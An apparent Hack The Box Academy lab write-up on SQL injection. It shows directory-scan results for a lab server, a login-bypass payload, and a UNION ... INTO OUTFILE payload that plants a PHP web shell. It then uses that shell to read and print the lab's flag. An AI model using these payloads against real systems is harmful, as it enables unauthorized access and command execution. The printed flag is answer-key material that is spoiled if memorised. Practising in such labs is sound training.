# Sql injections fundamentals:
The company inlanfreitgh has contracted to perform web app assesments against one of their public-facing website.
In light of a recent breach of one of their main competitors, they are particulary concerned with SLQ injection vulnerability and the damaga dicovery
ans susscessful explotation of this attack could do to their public image and bottom line.

## IP:
83.136.252.13:52940
Directories:
[08:01:53] 403 -   281B - /.php
[08:02:01] 200 -     0B - /config.php
[08:02:01] 301 -   327B - /dashboard  ->  http://83.136.252.13:52940/dashboard/
[08:02:01] 200 -     0B - /dashboard/
[08:02:01] 200 -   745B - /db.sql
[08:02:04] 200 -   907B - /index.php
[08:02:04] 200 -   907B - /index.php/login/
[08:02:05] 200 -    1KB - /license.txt
[08:02:09] 403 -   281B - /server-status
[08:02:09] 403 -   281B - /server-status/

We can try the payload:
admin' or '1'='1'-- -
Now try the shell execution in the page:
' UNION SELECT 1, 2, '<?php system($_REQUEST[0]); ?>', 4, 5 INTO OUTFILE '/var/www/html/dashboard/shell.php'-- -

And see some enumerations we can find the
flag_cae1dadcd174.txt
Then:
http://83.136.252.13:52940/dashboard/shell.php?0=cat%20/flag_cae1dadcd174.txt
We get the flag:
528d6d9cedc2c7aab146ef226e918396
https://academy.hackthebox.com/achievement/349590/33
